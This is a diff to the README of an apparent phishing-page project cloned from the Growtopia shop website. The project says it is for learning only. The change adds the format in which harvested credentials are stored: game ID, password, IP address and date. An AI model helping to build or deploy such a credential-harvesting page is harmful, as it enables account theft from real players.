@@ -6,6 +6,14 @@ This project is a simple phishing page. <br>
 It has been cloned from the official Growtopia shop website. <br>
 This project has been created for learning purposes only! <br>
 It should **never** be used against other people. <br>
+Collected data is saved in this format: <br>
+
+```
+GrowID=Username
+Password=Password
+IP=127.0.0.1
+Date=2020-01-01 12:00:00
+```
 
 ## How To Deploy?
 
